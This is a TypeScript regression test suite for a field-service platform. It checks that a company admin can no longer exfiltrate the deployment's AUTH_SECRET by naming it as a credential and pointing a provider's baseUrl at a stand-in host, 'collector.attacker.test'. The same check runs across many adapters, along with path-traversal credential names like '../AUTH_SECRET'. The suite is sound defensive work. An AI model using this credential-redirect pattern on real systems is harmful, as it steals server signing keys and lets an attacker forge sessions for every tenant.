import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from "vitest";
import postgres from "postgres";
import { randomBytes } from "node:crypto";
import { connectors, type Actor } from "@opentradesos/core";
import * as payments from "../src/services/payments";
import * as billing from "../src/services/billing";
import * as customers from "../src/services/customers";
import * as leadIntake from "../src/services/lead-intake";
import * as ai from "../src/services/ai";
import * as voice from "../src/services/voice";
import * as geocoding from "../src/services/geocoding";
import * as transcription from "../src/services/transcription";
import { sendCodeDirect } from "../src/services/field-devices";
import { createTranscriptionProvider } from "../src/voice/transcription";
import * as softphone from "../src/services/softphone";
import * as financing from "../src/services/financing";
import * as adPlatforms from "../src/services/ad-platforms";
import { createRouter } from "../src/routing/provider";
import { createMailProvider } from "../src/direct-mail/provider";
import { createMarketplace } from "../src/marketplaces/provider";
import { createFinancingProvider } from "../src/financing/provider";
import { schema } from "@opentradesos/db";
import { and, eq } from "drizzle-orm";
import "../src/routing";
import "../src/direct-mail";
import "../src/marketplaces";
import "../src/financing";
import "../src/ads";
import { createPaymentProvider } from "../src/payments/provider";
import { createAiProvider } from "../src/ai/provider";
import { createVoiceProvider } from "../src/voice/provider";
import { createGeocoder, resetPace } from "../src/maps/provider";
import { environmentSecretStore, readerFor, SecretNotSetError } from "../src/secrets/store";
import { ConflictError, type ServiceContext } from "../src/services/context";
import "../src/payments";
import "../src/ai";
import "../src/voice";
import "../src/maps";
import { seedOrg, resetOrg, testDb, fixtureId } from "./helpers";

/**
 * A COMPANY CANNOT READ THE DEPLOYMENT'S SECRETS
 *
 * The attack this file exists for, in two settings a company admin holding
 * `integration:write` could make:
 *
 *   credentialRef  AUTH_SECRET            (the server's session signing key)
 *   baseUrl        https://their-host     (where the adapter sends requests)
 *
 * The secret store read `process.env[credentialRef]`, and the Stripe adapter
 * posted to `baseUrl` with that value as its bearer token. The first payment
 * link anybody opened sent the deployment's session key to the attacker,
 * who could then sign a session for every company on the server.
 *
 * Both halves are closed and both are tested, because either alone was
 * already a leak: the name half reads any variable through any provider that
 * reports its credential somewhere visible, and the endpoint half sends a
 * company's own key somewhere it never agreed to.
 */
const url = process.env.DATABASE_URL;
if (!url && process.env.CI) {
  throw new Error("DATABASE_URL is not set. These tests must run in CI, not skip.");
}
const run = url ? describe : describe.skip;

const ORG = fixtureId("secretns:org");
const USER = fixtureId("secretns:user");
const OTHER = fixtureId("secretns:other-org");
const OTHER_USER = fixtureId("secretns:other-user");

/** Built at runtime, so nothing in the repository reads as a key. */
const fakeValue = (label: string) => `${label}-${randomBytes(18).toString("hex")}`;
const ATTACKER = ["https://", "collector", ".attacker.test", "/v1"].join("");

let raw: postgres.Sql;
const db = () => testDb(url!);
const ctx = (org = ORG, user = USER): ServiceContext => ({
  actor: { userId: user, organizationId: org, roles: ["owner"] as Actor["roles"] },
  db: db(),
});

/** Every request the adapters make, with where it went and what it carried. */
interface Sent { url: string; headers: string }
let sent: Sent[];
const env: Record<string, string | undefined> = {};

function setEnv(name: string, value: string | undefined): void {
  if (!(name in env)) env[name] = process.env[name];
  if (value === undefined) delete process.env[name];
  else process.env[name] = value;
}

beforeAll(async () => {
  if (!url) return;
  raw = postgres(url, { max: 1, onnotice: () => {} });
});

afterAll(async () => {
  if (!raw) return;
  await resetOrg(raw, ORG);
  await resetOrg(raw, OTHER);
  await raw.end();
});

beforeEach(async () => {
  if (!url) return;
  await seedOrg(raw, { organizationId: ORG, userId: USER, name: "Secret Ns Co", slug: "secret-ns-co" });
  await seedOrg(raw, { organizationId: OTHER, userId: OTHER_USER, name: "Other Ns Co", slug: "other-ns-co" });
  sent = [];
  vi.stubGlobal("fetch", vi.fn(async (input: string | URL, init?: RequestInit) => {
    sent.push({ url: String(input), headers: JSON.stringify(init?.headers ?? {}) });
    return new Response(JSON.stringify({ error: { message: "refused by the test" } }), {
      status: 401, headers: { "content-type": "application/json" },
    });
  }));
  // The deployment never allows endpoint overrides; this file proves why.
  setEnv("ALLOW_PROVIDER_BASE_URL", undefined);
});

afterEach(() => {
  vi.unstubAllGlobals();
  for (const [name, value] of Object.entries(env)) {
    if (value === undefined) delete process.env[name];
    else process.env[name] = value;
    delete env[name];
  }
});

async function customerWithInvoice() {
  const customer = await customers.create(ctx(), {
    type: "residential", name: "Card Payer", paymentTermsDays: 0,
    taxExempt: false, tags: [], customFields: {},
  });
  const invoice = await billing.create(ctx(), {
    customerId: customer.id,
    lines: [{ name: "Repair", quantity: "1", unitPrice: "100.00", discountAmount: "0", taxable: false }],
  });
  return { customerId: customer.id, invoiceId: invoice.id as string };
}

/** A connection row as it could be stored by an earlier version, or by hand. */
async function storeStripe(org: string, credentialRef: string, settings: Record<string, unknown>) {
  await raw`
    insert into public.integration_connection
      (organization_id, capability, provider, status, credential_ref, settings)
    values (${org}, 'payments', 'stripe', 'connected', ${credentialRef}, ${raw.json(settings as never)})
    on conflict (organization_id, capability, provider)
      do update set credential_ref = excluded.credential_ref, settings = excluded.settings`;
}

run("naming the deployment's own secret", () => {
  it("does not reach the deployment's AUTH_SECRET however the name is typed", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);

    for (const name of ["AUTH_SECRET", "DATABASE_URL", "OPERATOR_TOKEN"]) {
      const error = await readerFor(db(), ORG)(name).catch((e: unknown) => e);
      expect(error).toBeInstanceOf(SecretNotSetError);
      // The error names the variable this company's secret has to be in, and
      // never echoes a value.
      expect((error as Error).message).toContain(connectors.environmentVariableFor(ORG, name));
      expect((error as Error).message).not.toContain(platform);
    }
  });

  it("refuses a name that is not a name, so nothing can climb out of the prefix", async () => {
    for (const name of ["../AUTH_SECRET", "AUTH SECRET", "", "kv/stripe"]) {
      await expect(readerFor(db(), ORG)(name)).rejects.toBeInstanceOf(ConflictError);
    }
  });

  it("reads a company's secret only under that company's prefix, and never another company's", async () => {
    const mine = fakeValue("ours");
    setEnv(connectors.environmentVariableFor(ORG, "STRIPE_SECRET_KEY"), mine);

    expect(await readerFor(db(), ORG)("STRIPE_SECRET_KEY")).toBe(mine);
    await expect(readerFor(db(), OTHER)("STRIPE_SECRET_KEY")).rejects.toBeInstanceOf(SecretNotSetError);
    // The other company cannot spell its way into the first one's prefix.
    const spelled = `${connectors.environmentVariablePrefix(ORG).replace(/^OTS_SECRET__/, "")}STRIPE_SECRET_KEY`;
    await expect(readerFor(db(), OTHER)(spelled)).rejects.toBeInstanceOf(ConflictError);
  });

  it("does not read the bare variable an earlier version used, and says what to rename it to", async () => {
    setEnv("STRIPE_SECRET_KEY", fakeValue("bare"));
    const error = await environmentSecretStore.read(db(), ORG, "STRIPE_SECRET_KEY").catch((e: unknown) => e);
    expect(error).toBeInstanceOf(SecretNotSetError);
    expect((error as Error).message).toMatch(/rename/);
    expect((error as Error).message).toContain(`OTS_SECRET__${ORG.replace(/-/g, "").toUpperCase()}__STRIPE_SECRET_KEY`);
  });
});

run("pointing a provider somewhere else", () => {
  it("refuses a baseUrl on connect, so it is never stored", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "stripe",
      credentialRef: "STRIPE_SECRET_KEY",
      settings: { publishableKey: "pk_test_ns", baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);

    await expect(ai.connect(ctx(), {
      provider: "anthropic",
      credentialRef: "ANTHROPIC_API_KEY",
      settings: { baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);

    const rows = await raw`select 1 from public.integration_connection where organization_id = ${ORG}`;
    expect(rows).toHaveLength(0);
  });

  it("refuses a credential name that is not a name", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "stripe", credentialRef: "../AUTH_SECRET", settings: {},
    })).rejects.toThrow(/not a usable secret name/);
  });

  it("ignores a stored baseUrl when the adapter is built, so requests go to the provider", async () => {
    const key = fakeValue("company-key");
    const stripe = createPaymentProvider("stripe", { baseUrl: ATTACKER }, key);
    await stripe.charge({ amountMinor: 100, currency: "usd", idempotencyKey: "k-ns-1" }).catch(() => null);
    const model = createAiProvider("anthropic", { baseUrl: ATTACKER }, key);
    await model.models().catch(() => null);

    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(request.url).not.toContain("attacker");
    expect(sent.map((r) => new URL(r.url).host)).toEqual(expect.arrayContaining(["api.stripe.com"]));
  });

  it("obeys one only where the deployment allows it, which only the test suites do", async () => {
    setEnv("ALLOW_PROVIDER_BASE_URL", "1");
    const stripe = createPaymentProvider("stripe", { baseUrl: ATTACKER }, fakeValue("k"));
    await stripe.charge({ amountMinor: 100, currency: "usd", idempotencyKey: "k-ns-2" }).catch(() => null);
    expect(sent[0]!.url.startsWith(ATTACKER)).toBe(true);
  });
});

run("the whole attack, through a payment link", () => {
  it("never sends the deployment's session key anywhere, and never sends anything to the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeStripe(ORG, "AUTH_SECRET", { publishableKey: "pk_test_ns", baseUrl: ATTACKER });
    const { customerId, invoiceId } = await customerWithInvoice();

    const outcome = await payments.intent(ctx(), { customerId, invoiceIds: [invoiceId] })
      .catch((e: unknown) => e);

    // Refused for want of THIS company's secret, naming where it would go.
    expect(outcome).toBeInstanceOf(SecretNotSetError);
    expect((outcome as Error).message).toContain(connectors.environmentVariableFor(ORG, "AUTH_SECRET"));
    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(sent.filter((r) => r.headers.includes(platform))).toEqual([]);
  });

  it("sends the company's own key to Stripe itself when that is what is set", async () => {
    const own = fakeValue("company-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    setEnv("AUTH_SECRET", fakeValue("platform-session-key"));
    await storeStripe(ORG, "AUTH_SECRET", { publishableKey: "pk_test_ns", baseUrl: ATTACKER });
    const { customerId, invoiceId } = await customerWithInvoice();

    await payments.intent(ctx(), { customerId, invoiceIds: [invoiceId] }).catch(() => null);

    expect(sent).toHaveLength(1);
    expect(new URL(sent[0]!.url).host).toBe("api.stripe.com");
    expect(sent[0]!.headers).toContain(own);
    expect(sent[0]!.headers).not.toContain(process.env["AUTH_SECRET"]!);
  });
});

/* ------------------------------------------------------------------------
 * THE PROVIDERS THAT ARRIVED AFTER THE FIX
 *
 * Calls on Twilio and the two geocoders came in with their own secret
 * readers (`process.env[credentialRef]`, the bug itself) and their own
 * endpoint settings (`baseUrl` on Mapbox and Twilio, `endpoint` on
 * Nominatim). The same attack against each: the credential named
 * AUTH_SECRET and the address pointed at the attacker. Nothing may reach
 * the attacker's host, and the deployment's key may go nowhere at all.
 * --------------------------------------------------------------------- */

const ACCOUNT_SID = "AC0000000000000000000000000000ns";
const WEBHOOK_TOKEN = "ns".repeat(24);

async function storeConnection(
  org: string, capability: string, provider: string, credentialRef: string | null, settings: Record<string, unknown>,
) {
  await raw`
    insert into public.integration_connection
      (organization_id, capability, provider, status, credential_ref, settings)
    values (${org}, ${capability}, ${provider}, 'connected', ${credentialRef}, ${raw.json(settings as never)})
    on conflict (organization_id, capability, provider)
      do update set credential_ref = excluded.credential_ref, settings = excluded.settings,
                    status = 'connected', deleted_at = null`;
}

/** The only maps connection the company has, so the pass asks this one. */
async function onlyGeocoder(provider: string, credentialRef: string | null, settings: Record<string, unknown>) {
  await raw`update public.integration_connection set status = 'disconnected'
            where organization_id = ${ORG} and capability = 'maps'`;
  await storeConnection(ORG, "maps", provider, credentialRef, settings);
}

/** An address the worker has never looked up, so the next pass asks the geocoder about it. */
async function freshAddress(): Promise<void> {
  await raw`
    insert into public.property (organization_id, address_line1, city, state, postal_code)
    values (${ORG}, ${`${Math.floor(Math.random() * 9000) + 100} Secret Ns Way`}, 'Austin', 'TX', '78701')`;
}

/** A clock that never makes the test wait for the public server's one a second. */
const quickClock = { now: () => 0, sleep: async () => {} };

async function geocodeOnce() {
  resetPace();
  return geocoding.geocodePending(db(), { only: [ORG], limit: 1000, deps: { clock: quickClock } });
}

const leaked = (secret: string) => sent.filter((r) => r.url.includes(secret) || r.headers.includes(secret));

run("the whole attack, through calls on Twilio", () => {
  it("refuses a baseUrl on the Twilio connection that voice uses", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "twilio",
      credentialRef: "TWILIO_AUTH_TOKEN",
      settings: { accountSid: ACCOUNT_SID, baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);
  });

  it("never sends the deployment's session key when buying a number, and never reaches the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeConnection(ORG, "messaging", "twilio", "AUTH_SECRET", {
      accountSid: ACCOUNT_SID, webhookToken: WEBHOOK_TOKEN, baseUrl: ATTACKER,
    });

    const outcome = await voice.searchNumbers(ctx(), { areaCode: "512" }).catch((e: unknown) => e);
    expect(outcome).toBeInstanceOf(SecretNotSetError);
    expect((outcome as Error).message).toContain(connectors.environmentVariableFor(ORG, "AUTH_SECRET"));

    // The carrier's webhook resolves its tenant from the token and reads that tenant's secret only.
    const webhook = await voice.resolveWebhook(db(), WEBHOOK_TOKEN).catch((e: unknown) => e);
    expect(webhook).toBeInstanceOf(SecretNotSetError);

    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(leaked(platform)).toEqual([]);
  });

  it("sends the company's own token to api.twilio.com when that is what is set", async () => {
    const own = fakeValue("company-twilio-token");
    const platform = fakeValue("platform-session-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    setEnv("AUTH_SECRET", platform);
    await storeConnection(ORG, "messaging", "twilio", "AUTH_SECRET", {
      accountSid: ACCOUNT_SID, webhookToken: WEBHOOK_TOKEN, baseUrl: ATTACKER,
    });

    await voice.searchNumbers(ctx(), { areaCode: "512" }).catch(() => null);
    const resolved = await voice.resolveWebhook(db(), WEBHOOK_TOKEN);
    await resolved!.provider.releaseNumber("PN0000").catch(() => null);

    expect(sent.length).toBeGreaterThanOrEqual(2);
    for (const request of sent) expect(new URL(request.url).host).toBe("api.twilio.com");
    expect(sent[0]!.headers).toContain(Buffer.from(`${ACCOUNT_SID}:${own}`).toString("base64"));
    expect(leaked(platform)).toEqual([]);
    expect(leaked(Buffer.from(`${ACCOUNT_SID}:${platform}`).toString("base64"))).toEqual([]);
  });

  it("ignores a stored baseUrl when the voice adapter is built, recordings included", async () => {
    const key = fakeValue("company-key");
    const carrier = createVoiceProvider("twilio", { accountSid: ACCOUNT_SID, baseUrl: ATTACKER }, key);
    await carrier.searchNumbers({ areaCode: "512", limit: 5 });
    // A recording "on the carrier's API" by the attacker's own reckoning is not on Twilio's.
    const recording = await carrier.fetchRecording(`${ATTACKER}/2010-04-01/Accounts/${ACCOUNT_SID}/Recordings/RE1`);
    expect(recording.ok).toBe(false);

    expect(sent).toHaveLength(1);
    expect(new URL(sent[0]!.url).host).toBe("api.twilio.com");
  });
});

run("the whole attack, through the Mapbox geocoder", () => {
  it("refuses a baseUrl on connect", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "mapbox", credentialRef: "MAPBOX_TOKEN", settings: { baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);
  });

  it("never sends the deployment's session key to look an address up, and never reaches the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await onlyGeocoder("mapbox", "AUTH_SECRET", { baseUrl: ATTACKER });
    await freshAddress();

    const pass = await geocodeOnce();

    const mine = pass.unusable.filter((u) => u.organizationId === ORG);
    expect(mine).toHaveLength(1);
    expect(mine[0]!.reason).toContain(connectors.environmentVariableFor(ORG, "AUTH_SECRET"));
    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(leaked(platform)).toEqual([]);
  });

  it("sends the company's own token to api.mapbox.com when that is what is set", async () => {
    const own = fakeValue("company-mapbox-token");
    const platform = fakeValue("platform-session-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    setEnv("AUTH_SECRET", platform);
    await onlyGeocoder("mapbox", "AUTH_SECRET", { baseUrl: ATTACKER });
    await freshAddress();

    await geocodeOnce();

    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("api.mapbox.com");
    expect(sent[0]!.url).toContain(own);
    expect(leaked(platform)).toEqual([]);
  });

  it("ignores a stored baseUrl when the geocoder is built", async () => {
    const key = fakeValue("company-key");
    const mapbox = createGeocoder("mapbox", { settings: { baseUrl: ATTACKER }, secret: key, clock: quickClock });
    resetPace();
    await mapbox.geocode({ query: "1 Main St, Austin, TX", address: { addressLine1: "1 Main St", city: "Austin", state: "TX", postalCode: "78701", country: "US" } });
    expect(sent).toHaveLength(1);
    expect(new URL(sent[0]!.url).host).toBe("api.mapbox.com");
  });
});

run("the whole attack, through the OpenStreetMap geocoder", () => {
  it("refuses an endpoint on connect", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "nominatim", settings: { endpoint: ATTACKER, contactEmail: "office@example.com" },
    })).rejects.toThrow(/where this server sends/);
  });

  it("sends a company's addresses only to the public server or the deployment's own, never where a connection says", async () => {
    setEnv("NOMINATIM_URL", undefined);
    await onlyGeocoder("nominatim", null, { endpoint: ATTACKER });
    await freshAddress();
    await geocodeOnce();
    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("nominatim.openstreetmap.org");

    // The deployment's operator, not the company, chooses a self hosted server.
    sent.length = 0;
    setEnv("NOMINATIM_URL", "https://nominatim.deployment.example");
    await freshAddress();
    await geocodeOnce();
    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("nominatim.deployment.example");
  });
});

run("the whole attack, through call transcripts on Whisper", () => {
  /** A kept recording waiting to be written out, so the next pass asks the provider. */
  async function pendingRecording(): Promise<void> {
    const key = `secretns/${randomBytes(6).toString("hex")}.mp3`;
    await raw`
      insert into public.stored_file (organization_id, storage_key, content_type, sha256, size_bytes, bytes)
      values (${ORG}, ${key}, 'audio/mpeg', ${"0".repeat(64)}, 3, ${Buffer.from([1, 2, 3])})`;
    await raw`
      insert into public.call (organization_id, direction, from_e164, to_e164, status,
                               recording_storage_key, transcript_status, transcript_source)
      values (${ORG}, 'inbound', '+15125550199', '+15125550100', 'completed', ${key}, 'pending', 'recording')`;
  }

  it("refuses an endpoint or a baseUrl on connect", async () => {
    for (const key of ["endpoint", "baseUrl"]) {
      await expect(leadIntake.connect(ctx(), {
        provider: "whisper", credentialRef: "OPENAI_API_KEY", settings: { [key]: ATTACKER },
      })).rejects.toThrow(/where this server sends/);
    }
  });

  it("never sends the deployment's session key with a call's audio, and never reaches the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeConnection(ORG, "transcription", "whisper", "AUTH_SECRET", { endpoint: ATTACKER });
    await pendingRecording();

    const outcome = await transcription.transcribePending(db(), ORG).catch((e: unknown) => e);
    expect(outcome).toBeInstanceOf(SecretNotSetError);
    expect((outcome as Error).message).toContain(connectors.environmentVariableFor(ORG, "AUTH_SECRET"));
    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(leaked(platform)).toEqual([]);
  });

  it("sends the company's own key, and the audio, only to OpenAI or the deployment's own server", async () => {
    const own = fakeValue("company-openai-key");
    const platform = fakeValue("platform-session-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    setEnv("AUTH_SECRET", platform);
    setEnv("WHISPER_URL", undefined);
    await storeConnection(ORG, "transcription", "whisper", "AUTH_SECRET", { endpoint: ATTACKER, baseUrl: ATTACKER });
    await pendingRecording();

    await transcription.transcribePending(db(), ORG, {}, 50);
    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("api.openai.com");
    expect(sent[0]!.headers).toContain(own);
    expect(leaked(platform)).toEqual([]);

    sent.length = 0;
    setEnv("WHISPER_URL", "https://whisper.deployment.example/v1");
    const office = createTranscriptionProvider("whisper", { endpoint: ATTACKER }, "");
    await office.transcribe({ bytes: new Uint8Array([1]), contentType: "audio/mpeg", fileName: "a.mp3", speaker: "call" });
    expect(sent).toHaveLength(1);
    expect(new URL(sent[0]!.url).host).toBe("whisper.deployment.example");
  });
});

run("the whole attack, through a technician's sign in code", () => {
  it("never sends the deployment's session key to the mail provider it names, and never reaches the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeConnection(ORG, "email", "resend", "AUTH_SECRET", {
      fromAddress: "office@secret-ns.example", baseUrl: ATTACKER,
    });
    const code = { organizationId: ORG, channel: "email" as const, to: "tech@secret-ns.example",
      subject: "Your code", body: "123456", reference: "secretns" };

    expect((await sendCodeDirect(db(), code)).sent).toBe(false);
    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(leaked(platform)).toEqual([]);

    // With the company's own key set, the code goes to Resend itself.
    const own = fakeValue("company-resend-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    await sendCodeDirect(db(), code);
    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("api.resend.com");
    expect(sent[0]!.headers).toContain(own);
    expect(leaked(platform)).toEqual([]);
  });
});

/**
 * A transport for the adapters that take one rather than calling `fetch`,
 * recording into the same list the stubbed `fetch` does.
 */
const recorder = (async (url: string, init?: { headers?: unknown }) => {
  sent.push({ url: String(url), headers: JSON.stringify(init?.headers ?? {}) });
  return new Response(JSON.stringify({ error: { message: "refused by the test" } }), {
    status: 401, headers: { "content-type": "application/json" },
  });
}) as never;

async function connectionRow(capability: string, provider: string) {
  const [row] = await db().select().from(schema.integrationConnection).where(and(
    eq(schema.integrationConnection.organizationId, ORG),
    eq(schema.integrationConnection.capability, capability as never),
    eq(schema.integrationConnection.provider, provider),
  ));
  return row!;
}

run("the whole attack, through the ad platforms (Google Analytics)", () => {
  it("refuses a baseUrl, an authUrl or a tokenUrl on connect, on every ad platform", async () => {
    for (const provider of ["ga4", "google_ads", "meta_ads", "bing_ads", "search_console"]) {
      for (const key of ["baseUrl", "authUrl", "tokenUrl"]) {
        await expect(leadIntake.connect(ctx(), { provider, settings: { [key]: ATTACKER } }))
          .rejects.toThrow(/where this server sends/);
      }
    }
  });

  it("never sends the deployment's session key as the Measurement Protocol secret, and never reaches the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeConnection(ORG, "analytics", "ga4", "AUTH_SECRET", { measurementId: "G-SECRETNS1", baseUrl: ATTACKER });
    const row = await connectionRow("analytics", "ga4");

    await expect(adPlatforms.adapterFor(db(), row, { transport: recorder })).rejects.toBeInstanceOf(SecretNotSetError);
    expect(sent).toEqual([]);

    // With the company's own secret it goes to Google, in the URL, and nowhere else.
    const own = fakeValue("company-ga4-secret");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    const adapter = await adPlatforms.adapterFor(db(), row, { transport: recorder });
    await adapter.sendEvents!([{
      eventId: "secretns-1", kind: "lead", at: new Date(), value: null, currency: "USD", clickId: null,
      clickParam: null, clickSeenAt: null, hashedEmail: null, hashedPhone: null, clientId: "123.456",
      browserId: null, adUserData: "DENIED",
    } as never]).catch(() => null);
    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(new URL(request.url).host).toBe("www.google-analytics.com");
    expect(sent[0]!.url).toContain(own);
    expect(leaked(platform)).toEqual([]);
  });
});

run("the whole attack, through the browser phone", () => {
  it("does not accept the deployment's own variable as the API key's secret", async () => {
    setEnv("AUTH_SECRET", fakeValue("platform-session-key"));
    await expect(softphone.setup(ctx(), {
      apiKeySid: `SK${"0".repeat(32)}`, apiKeySecretRef: "AUTH_SECRET", callerIdNumberId: randomUUIDLike(),
    })).rejects.toThrow(/Nothing is stored under AUTH_SECRET/);
  });
});

run("the whole attack, through customer financing (Wisetack)", () => {
  it("refuses a baseUrl on connect", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "wisetack", credentialRef: "WISETACK_TOKEN", settings: { merchantId: "m-1", baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);
  });

  it("verifies a lender's webhook only with the company's own signing secret", async () => {
    setEnv("AUTH_SECRET", fakeValue("platform-session-key"));
    await storeConnection(ORG, "financing", "wisetack", "AUTH_SECRET", {
      merchantId: "m-1", webhookSecretRef: "AUTH_SECRET", baseUrl: ATTACKER,
    });
    const row = await connectionRow("financing", "wisetack");
    const answer = await financing.receiveWebhook(db(), {
      connectionId: row.id, request: { url: "https://ots.test/hook", headers: {}, body: "{}" } as never,
    });
    // The deployment's AUTH_SECRET is not this company's secret, so nothing can be verified with it.
    expect(answer.status).toBe(409);
    expect(sent).toEqual([]);
  });

  it("ignores a stored baseUrl when the lender's adapter is built", async () => {
    const key = fakeValue("company-key");
    const lender = createFinancingProvider("wisetack", { merchantId: "m-1", baseUrl: ATTACKER }, key);
    await lender.readApplication("app-1").catch(() => null);
    expect(sent).toHaveLength(1);
    expect(sent[0]!.url).not.toContain("attacker");
  });
});

const PARTY = { name: "Pat", line1: "1 Main St", line2: null, city: "Austin", state: "tx", postalCode: "78701" };

run("stored endpoint overrides on the newest adapters", () => {
  it("never sends a routing, mail or marketplace credential where a stored setting points", async () => {
    const key = fakeValue("company-key");
    const route = { sources: [{ lat: 30.3, lng: -97.7 }], destinations: [{ lat: 30.2, lng: -97.8 }] };
    await createRouter("mapbox_directions", { settings: { baseUrl: ATTACKER }, secret: key }).matrix(route as never);
    await createRouter("openrouteservice", { settings: { endpoint: ATTACKER, baseUrl: ATTACKER }, secret: key })
      .matrix(route as never);
    // OSRM has no address of its own, so a stored one leaves it with none rather than the attacker's.
    expect(await createRouter("osrm", { settings: { endpoint: ATTACKER }, secret: null }).matrix(route as never))
      .toMatchObject({ kind: "failed" });

    await createMailProvider("lob", { settings: { baseUrl: ATTACKER }, apiKey: key, transport: recorder }).send({
      kind: "postcard", description: "secretns", to: PARTY, from: PARTY, idempotencyKey: "secretns", qrUrl: "https://x.test",
      front: "f", back: "b",
    } as never).catch(() => null);
    await createMarketplace("thumbtack", {
      settings: { baseUrl: ATTACKER, businessId: "biz-1" }, apiToken: key, webhookSecret: null, transport: recorder,
    }).sendMessage!("lead-1", "hello").catch(() => null);

    expect(sent.length).toBeGreaterThanOrEqual(4);
    for (const request of sent) expect(request.url).not.toContain("attacker");
    expect(sent.map((r) => new URL(r.url).host)).toEqual(expect.arrayContaining([
      "api.mapbox.com", "api.openrouteservice.org", "api.lob.com", "api.thumbtack.com",
    ]));
  });

  it("refuses a routing server's address on connect, which is the deployment's to set", async () => {
    for (const [provider, key] of [["osrm", "endpoint"], ["openrouteservice", "endpoint"], ["mapbox_directions", "baseUrl"]]) {
      await expect(leadIntake.connect(ctx(), { provider: provider!, settings: { [key!]: ATTACKER } }))
        .rejects.toThrow(/where this server sends/);
    }
  });
});

function randomUUIDLike(): string {
  const h = randomBytes(16).toString("hex");
  return `${h.slice(0, 8)}-${h.slice(8, 12)}-4${h.slice(13, 16)}-8${h.slice(17, 20)}-${h.slice(20, 32)}`;
}
